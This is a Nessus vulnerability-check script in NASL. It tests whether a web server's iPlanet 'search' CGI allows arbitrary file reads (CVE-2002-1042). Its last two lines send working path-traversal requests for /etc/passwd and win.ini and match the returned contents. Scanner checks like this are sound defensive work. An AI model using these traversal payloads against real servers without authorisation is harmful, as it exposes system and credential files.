#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#


include("compat.inc");

if (description)
{
 script_id(11043);
 script_version("$Revision: 1.25 $");
 script_cvs_date("$Date: 2016/10/27 15:03:53 $");

 script_cve_id("CVE-2002-1042");
 script_bugtraq_id(5191);
 script_osvdb_id(846);
 
 script_name(english:"iPlanet Search Engine search CGI Arbitrary File Access");
 script_summary(english:"Attempts to read an arbitrary file using a feature in iPlanet"); 

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is hosting a CGI application that is affected
by an information disclosure vulnerability.");
 script_set_attribute(attribute:"description", value:
"An attacker may be able to read arbitrary files on the remote web 
server, using the 'search' CGI that comes with iPlanet.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jul/85");
 script_set_attribute(attribute:"solution", value:
"Upgrade to iPlanet Web Server 4.1 Service Pack 11 or Sun ONE Web 
Server 6.0 Service Pack 4, as it has been reported to fix this 
vulnerability.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2002/07/10");
 script_set_attribute(attribute:"vuln_publication_date", value:"2002/07/09");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


function check(item, exp)
{
 local_var res, r, r2;
 res = http_send_recv3(method:"GET", item:item, port:port);
 if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

 if(egrep(string:res[2], pattern:exp, icase:1)){
 	r2 = strstr(res[1], '\r\n\r\n');
	if (strlen(r2) == 0) r2 = res[2];
	else r2 -= '\r\n\r\n';
	r = strcat('\n', build_url(port: port, qs: item),
	  '\nrevealed the content of a protected file :\n', r2, '\n');
	security_warning(port:port, extra: r);
	exit(0);
	}
 return(0);
}


check(item:"/search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini", exp:"\[fonts\]");
check(item:"/search?NS-query-pat=../../../../../../../../../etc/passwd", exp:"root:.*:0:[01]:.*");
